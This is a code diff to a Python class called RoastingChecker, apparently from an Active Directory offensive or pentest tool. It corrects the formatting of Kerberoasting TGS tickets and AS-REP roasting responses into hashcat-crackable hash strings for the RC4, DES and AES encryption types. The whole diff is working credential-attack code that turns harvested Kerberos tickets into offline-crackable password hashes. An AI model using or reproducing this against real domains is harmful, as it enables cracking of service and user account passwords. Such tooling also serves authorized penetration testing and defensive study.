@@ -178,22 +178,22 @@ class RoastingChecker:
             self.logger.error(f"[-] Error during kerberoasting: {e}")
     
     def _format_tgs_hash(self, tgs, cipher, username: str, spn: str) -> Optional[str]:
-        """Format TGS ticket as hashcat-compatible hash."""
+        """Format TGS ticket as hashcat-compatible hash (same layout as impacket GetUserSPNs)."""
         try:
             decoded = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
             enc_part = decoded['ticket']['enc-part']
             etype = int(enc_part['etype'])
-            cipher_data = bytes(enc_part['cipher']).hex()
+            cipher_bytes = enc_part['cipher'].asOctets()
+            # Ticket realm (uppercase) - the AES salt is REALM + username, so user input casing breaks cracking
+            realm = str(decoded['ticket']['realm'])
+            spn = spn.replace(':', '~')
             
-            # Hashcat format for krb5tgs
-            if etype == 23:  # RC4
-                return f"$krb5tgs$23$*{username}${self.domain}${spn}*${cipher_data[:32]}${cipher_data[32:]}"
-            elif etype == 17:  # AES128
-                return f"$krb5tgs$17${self.domain}${username}$*{spn}*${cipher_data[:32]}${cipher_data[32:]}"
-            elif etype == 18:  # AES256
-                return f"$krb5tgs$18${self.domain}${username}$*{spn}*${cipher_data[:32]}${cipher_data[32:]}"
-            else:
-                return f"$krb5tgs${etype}$*{username}${self.domain}${spn}*${cipher_data}"
+            if etype in (17, 18):  # AES: checksum is the LAST 12 bytes (hashcat 19600/19700)
+                return f"$krb5tgs${etype}${username}${realm}$*{spn}*${cipher_bytes[-12:].hex()}${cipher_bytes[:-12].hex()}"
+            elif etype in (23, 3):  # RC4 (hashcat 13100) / DES: checksum is the FIRST 16 bytes
+                return f"$krb5tgs${etype}$*{username}${realm}${spn}*${cipher_bytes[:16].hex()}${cipher_bytes[16:].hex()}"
+            self.logger.debug(f"Skipping TGS for {username}: unsupported etype {etype}")
+            return None
         except Exception as e:
             self.logger.debug(f"Failed to format hash: {e}")
             return None
@@ -335,13 +335,11 @@ class RoastingChecker:
             etype = int(as_rep["enc-part"]["etype"])
             cipher_bytes = as_rep["enc-part"]["cipher"].asOctets()
             
-            hash_tgt = f"$krb5asrep${etype}${username}@{domain}:"
-            if etype in (17, 18):  # AES
-                hash_tgt += f"{hexlify(cipher_bytes[:12]).decode()}${hexlify(cipher_bytes[12:]).decode()}"
-            else:  # RC4
-                hash_tgt += f"{hexlify(cipher_bytes[:16]).decode()}${hexlify(cipher_bytes[16:]).decode()}"
-            
-            return hash_tgt
+            # Same layout as impacket GetNPUsers (hashcat format)
+            if etype in (17, 18):  # AES (hashcat 32100/32200): checksum is the LAST 12 bytes
+                return f"$krb5asrep${etype}${username}${domain}${hexlify(cipher_bytes[-12:]).decode()}${hexlify(cipher_bytes[:-12]).decode()}"
+            # RC4 (hashcat 18200): checksum is the FIRST 16 bytes
+            return f"$krb5asrep${etype}${username}@{domain}:{hexlify(cipher_bytes[:16]).decode()}${hexlify(cipher_bytes[16:]).decode()}"
                 
         except KerberosError as e:
             if 'KDC_ERR_PREAUTH_REQUIRED' in str(e) or e.getErrorCode() == constants.ErrorCodes.KDC_ERR_PREAUTH_REQUIRED.value:
